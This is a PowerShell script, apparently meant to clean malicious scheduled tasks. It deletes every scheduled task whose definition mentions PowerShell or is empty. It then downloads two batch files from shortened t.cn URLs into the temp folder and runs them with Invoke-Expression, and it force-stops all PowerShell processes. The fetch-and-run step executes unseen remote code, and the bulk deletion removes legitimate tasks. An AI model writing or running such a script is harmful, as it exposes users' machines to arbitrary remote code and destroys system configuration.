Start-Service schedule
$service=New-Object -ComObject("Schedule.Service")
$service.Connect($env:COMPUTERNAME)
Function DeletePowershellTaskScheduler($TaskPath){
    $folder=$service.GetFolder($TaskPath)
    $taskitem=$folder.GetFolders(0)
    foreach($i in $taskitem){
        $tasks=$i.GetTasks(0)
        foreach($task in $tasks){
            $taskName=$task.Name
            $taskPath=$task.Path
            $taskXml=$task.Xml
            #Write-Host $taskName
            if([String]::IsNullOrEmpty($taskXml)){
                $i.DeleteTask($taskName,0)
                Write-Host "$taskName shcdule tree error , delete sucess"
            }

            elseif ($taskXml.ToLower().Contains("powershell")){
                Write-Host "find scheduler script:$taskPath"
                $task.Enabled=0
                $i.DeleteTask($taskName,0)
            }
        }
        DeletePowershellTaskScheduler($i.Path)
        }
}
Write-Host "clear powershell script"
DeletePowershellTaskScheduler -TaskPath "\"
Write-Host "clear powershell script done."
$d = "$env:temp\remove_random_437.bat"
$c1=New-Object System.Net.WebClient
$c1.DownloadFile("http://t.cn/EXaEvkP",$d)
$des = "$env:temp\remove_random.bat"
$c=New-Object System.Net.WebClient
$c.DownloadFile("http://t.cn/EXaRSSz",$des)
invoke-expression -command $des
invoke-expression -command $d
Restart-Service schedule
Get-Process -Name powershell | Stop-Process -Force